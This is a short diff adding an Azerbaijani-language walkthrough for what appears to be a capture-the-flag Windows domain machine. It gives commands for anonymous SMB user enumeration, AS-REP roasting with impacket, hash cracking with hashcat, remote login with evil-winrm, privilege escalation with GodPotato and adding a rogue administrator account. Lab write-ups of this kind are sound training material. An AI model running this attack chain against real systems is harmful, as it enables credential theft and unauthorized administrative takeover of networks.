@@ -1,0 +1,23 @@
+1) nxc smb ip -u ' ' -p ' ' --users   ---userlər çıxır burda çoxlu. çıxan nəticəni kopyalayıb users.txt  faylına yapışdır (bizə  burdan əvvəlcədən bilirikki  dev_build useri lazımdır, amma ümumi bu formada olmalıdı).
+
+2) cat users.txt | awk '{print $sütun}' > usernames.txt    ---çıxan nəticədə ancaq userlərin adları yazılan sütunu çıxarmaq üçün bu əmri icra edirik və usernames.txt qovluğuna userləri yazır.
+
+3) impacket-GetNPUsers holberton.local/ -usersfile usernames.txt -dc-ip 10.129.8.98 -outputfile userhash.txt   ---usernames.txt faylındakı userlərin parolunun hashini almaq üçün əmrdi bu.
+
+4) hashcat -m 18200 userhash.txt /usr/share/wordlists/rockyou.txt    ---userdən aldığımız hashi qırırıq və nəticə çıxacaq orda parol görünür sonda medium faylında şəkildə var nəticə hissəsi ona oxşar olacaq.
+
+5) evil-winrm -i 10.129.8.98 -u tapdığımız_user -p userin_parolu    ---userə daxil olub Desktopdan user.txt faylını oxuyuruq
+
+6) upload GodPotato-NET4.exe 
+
+7) .\GodPotato-NET4.exe -cmd "net user yeni_istifadeci Parol123! /add"
+
+8) .\GodPotato-NET4.exe -cmd "net localgroup Administrators yeni_istifadeci /add"
+
+9) evil-winrm -i dc-ip -u yeni_istifadeci -p parolu
+
+10) cd C:\Users\Administrator\Dektop
+
+11) cat root.txt
+
+
